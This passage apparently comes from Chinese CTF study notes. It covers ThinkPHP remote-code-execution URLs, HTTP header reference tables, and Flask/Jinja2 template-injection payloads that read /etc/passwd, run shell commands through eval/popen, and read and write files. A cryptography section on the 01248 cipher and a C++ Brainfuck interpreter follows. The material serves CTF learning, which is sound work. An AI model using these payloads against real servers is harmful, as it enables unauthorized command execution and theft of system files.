```url
//执行php命令
index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=111
//执行系统命令
index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```



## HTTP Header

### request

| Header              | 解释                                                         | 示例                                                    |
| :------------------ | :----------------------------------------------------------- | :------------------------------------------------------ |
| Accept              | 指定客户端能够接收的内容类型                                 | Accept: text/plain, text/html                           |
| Accept-Charset      | 浏览器可以接受的字符编码集。                                 | Accept-Charset: iso-8859-5                              |
| Accept-Encoding     | 指定浏览器可以支持的web服务器返回内容压缩编码类型。          | Accept-Encoding: compress, gzip                         |
| Accept-Language     | 浏览器可接受的语言                                           | Accept-Language: en,zh                                  |
| Accept-Ranges       | 可以请求网页实体的一个或者多个子范围字段                     | Accept-Ranges: bytes                                    |
| Authorization       | HTTP授权的授权证书                                           | Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==       |
| Cache-Control       | 指定请求和响应遵循的缓存机制                                 | Cache-Control: no-cache                                 |
| Connection          | 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）           | Connection: close                                       |
| Cookie              | HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 | Cookie: $Version=1; Skin=new;                           |
| Content-Length      | 请求的内容长度                                               | Content-Length: 348                                     |
| Content-Type        | 请求的与实体对应的MIME信息                                   | Content-Type: application/x-www-form-urlencoded         |
| Date                | 请求发送的日期和时间                                         | Date: Tue, 15 Nov 2010 08:12:31 GMT                     |
| Expect              | 请求的特定的服务器行为                                       | Expect: 100-continue                                    |
| From                | 发出请求的用户的Email                                        | From: user@email.com                                    |
| Host                | 指定请求的服务器的域名和端口号                               | Host: www.zcmhi.com                                     |
| If-Match            | 只有请求内容与实体相匹配才有效                               | If-Match: “737060cd8c284d8af7ad3082f209582d”            |
| If-Modified-Since   | 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 | If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT        |
| If-None-Match       | 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 | If-None-Match: “737060cd8c284d8af7ad3082f209582d”       |
| If-Range            | 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag | If-Range: “737060cd8c284d8af7ad3082f209582d”            |
| If-Unmodified-Since | 只在实体在指定时间之后未被修改才请求成功                     | If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT      |
| Max-Forwards        | 限制信息通过代理和网关传送的时间                             | Max-Forwards: 10                                        |
| Pragma              | 用来包含实现特定的指令                                       | Pragma: no-cache                                        |
| Proxy-Authorization | 连接到代理的授权证书                                         | Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== |
| Range               | 只请求实体的一部分，指定范围                                 | Range: bytes=500-999                                    |
| Referer             | 先前网页的地址，当前请求网页紧随其后,即来路                  | Referer: http://www.zcmhi.com/archives/71.html          |
| TE                  | 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息     | TE: trailers,deflate;q=0.5                              |
| Upgrade             | 向服务器指定某种传输协议以便服务器进行转换（如果支持）       | Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11          |
| User-Agent          | User-Agent的内容包含发出请求的用户信息                       | User-Agent: Mozilla/5.0 (Linux; X11)                    |
| Via                 | 通知中间网关或代理服务器地址，通信协议                       | Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)             |
| Warning             | 关于消息实体的警告信息                                       | Warn: 199 Miscellaneous warning                         |
| X-Forwarded-For     | 用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 | X-Forwarded-For:127.0.0.1                               |

### response

|       Header       |                             解释                             |                         示例                          |
| :----------------: | :----------------------------------------------------------: | :---------------------------------------------------: |
|   Accept-Ranges    |      表明服务器是否支持指定范围请求及哪种类型的分段请求      |                 Accept-Ranges: bytes                  |
|        Age         |     从原始服务器到代理缓存形成的估算时间（以秒计，非负）     |                        Age: 12                        |
|       Allow        |        对某网络资源的有效的请求行为，不允许则返回405         |                   Allow: GET, HEAD                    |
|   Cache-Control    |           告诉所有的缓存机制是否可以缓存及哪种类型           |                Cache-Control: no-cache                |
|  Content-Encoding  |            web服务器支持的返回内容压缩编码类型。             |                Content-Encoding: gzip                 |
|  Content-Language  |                         响应体的语言                         |                Content-Language: en,zh                |
|   Content-Length   |                         响应体的长度                         |                  Content-Length: 348                  |
|  Content-Location  |                请求资源可替代的备用的另一地址                |             Content-Location: /index.htm              |
|    Content-MD5     |                     返回资源的MD5校验值                      |         Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==         |
|   Content-Range    |                在整个返回体中本部分的字节位置                |        Content-Range: bytes 21010-47021/47022         |
|    Content-Type    |                      返回内容的MIME类型                      |        Content-Type: text/html; charset=utf-8         |
|        Date        |                   原始服务器消息发出的时间                   |          Date: Tue, 15 Nov 2010 08:12:31 GMT          |
|        ETag        |                  请求变量的实体标签的当前值                  |       ETag: “737060cd8c284d8af7ad3082f209582d”        |
|      Expires       |                     响应过期的日期和时间                     |        Expires: Thu, 01 Dec 2010 16:00:00 GMT         |
|   Last-Modified    |                    请求资源的最后修改时间                    |     Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT      |
|      Location      |  用来重定向接收方到非请求URL的位置来完成请求或标识新的资源   |    Location: http://www.zcmhi.com/archives/94.html    |
|       Pragma       |      包括实现特定的指令，它可应用到响应链上的任何接收方      |                   Pragma: no-cache                    |
| Proxy-Authenticate |         它指出认证方案和可应用到代理的该URL上的参数          |               Proxy-Authenticate: Basic               |
|      refresh       | 应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持） | Refresh: 5; url=http://www.zcmhi.com/archives/94.html |
|    Retry-After     |     如果实体暂时不可取，通知客户端在指定时间之后再次尝试     |                   Retry-After: 120                    |
|       Server       |                      web服务器软件名称                       |     Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)      |
|     Set-Cookie     |                       设置Http Cookie                        |  Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1  |
|      Trailer       |               指出头域在分块传输编码的尾部存在               |                 Trailer: Max-Forwards                 |
| Transfer-Encoding  |                         文件传输编码                         |               Transfer-Encoding:chunked               |
|        Vary        |        告诉下游代理是使用缓存响应还是从原始服务器请求        |                        Vary: *                        |
|        Via         |              告知代理客户端响应是通过哪里发送的              |      Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)      |
|      Warning       |                    警告实体可能存在的问题                    |          Warning: 199 Miscellaneous warning           |
|  WWW-Authenticate  |             表明客户端请求实体应该使用的授权方案             |                WWW-Authenticate: Basic                |

## Python

### templete injection

1. 简单嗅探

   http://111.198.29.45:42611/{{7+7}}

   若返回：URL http://111.198.29.45:59331/14 not found，则说明执行了{{}}内的代码

2. {{ config.items() }}查看服务器配置

3. {{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}  读取密码

4. 执行代码

   ```python
   {% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__ == 'catch_warnings' %}
     {% for b in c.__init__.__globals__.values() %}  
     {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
       {% if 'eval' in b.keys() %}    //找到了
         {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
       {% endif %}
     {% endif %}
     {% endfor %}
   {% endif %}
   {% endfor %}
   ```

5. 读文件

   ```python
   ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
   ```

6. 写文件

   ```python
    ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
   ```

7. 

# 密码学

## 云影密码（01248）

使用 01248 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1->26 表示 A->Z。

## **BrainFuck语言**（><+-.,[]）

极简的一种图灵完备的语言，由Urban Müller在1993年创造，由八个指令组成（如下表）。工作机制与图灵机非常相似，有一条足够长的纸带，初始时纸带上的每一格都是0，有一个数据读写头指向纸带的初始位置，读写头的行为由指令指示。

| 指令 | 含义                                                   |
| ---- | ------------------------------------------------------ |
| >    | 指针向右移动一位                                       |
| <    | 指针向左移动一位                                       |
| +    | 指针所指位置的值增加1字节                              |
| -    | 指针所指位置的值减少1字节                              |
| .    | 将指针所指位置的值按ASCII表输出                        |
| ,    | 接受1字节的输入，存储在当前指针所指位置                |
| [    | 当指针当前处的值为0时，跳转到对应]之后；否则，顺序执行 |
| ]    | 跳转回对应[处                                          |

**编译器实现（c++）**:

```c++
#include <iostream>
#include <cstdio>
#include <cstring>

using namespace std;
#define MaxCodeLen 1000                                     //代码最大长度
#define MaxTapeLen 3000                                     //纸带最大长度

char Code[MaxCodeLen];                                      //代码
char Tape[MaxTapeLen];                                      //纸带
int St[MaxCodeLen / 2];                                     //用来匹配括号的栈
int top = 0;                                                //栈顶

int isLegalInstruction(char ch)
{
    int Ret = 0;
    switch(ch)
    {
        case '>' :
        case '<' :
        case '+' :
        case '-' :
        case '.' :
        case ',' :
        case '[' :
        case ']' : Ret = 1; break;
        case '\n' :
        case ' ' :
        case '\t' : Ret = 2; break;
        default : break;
    }
    return Ret;
}

int main()
{
    freopen("Pro.txt", "r", stdin);
    char ch;
    int len = 0;
    int cur = 0;
    int i, cnt;
    char* p = Tape + MaxTapeLen / 2;                        //为了方便左右移动，让纸带从中间开始
    while((ch = getchar()) != EOF)
    {
        //printf("ch = %c\n", ch);
        switch(isLegalInstruction(ch))
        {
            case 0 :
                printf("illegal instruction\n");
                return 0;
            case 1 :
                Code[len++] = ch;
                break;
            default:
                break;
        }
    }
    //Code[len] = '\0';
    //printf("%s\n", Code);
    freopen("CON", "r", stdin);
    while(cur < len)
    {
        switch(Code[cur])
        {
            case '>' :
                p++;
                break;
            case '<' :
                p--;
                break;
            case '+' :
                (*p)++;
                break;
            case '-' :
                (*p)--;
                break;
            case '.' :
                printf("%c", *p);
                break;
            case ',' :
                *p = getchar();
                break;
            case '[' :
                if(*p)
                {
                    St[top++] = cur;
                }
                else
                {
                    cnt = 0;
                    for(i = cur; i < len; i++)
                    {
                        if(Code[i] == '[')
                            cnt++;
                        if(Code[i] == ']')
                            cnt--;
                        if(!cnt)
                            break;
                    }
                    if(!cnt)
                    {
                        cur = i;
                    }
                    else
                    {
                        printf("parentheses do not match\n");   //左括号比右括号多
                        return 0;
                    }
                }
                break;
            case ']' :
                cur = St[top - 1] - 1;
                top--;
                break;
            default:
                break;
        }
        cur++;
        if(top < 0)
        {
            printf("parentheses do not match\n");               //右括号比左括号多
            return 0;
        }
    }
    printf("\n");
    return 0;
}
```

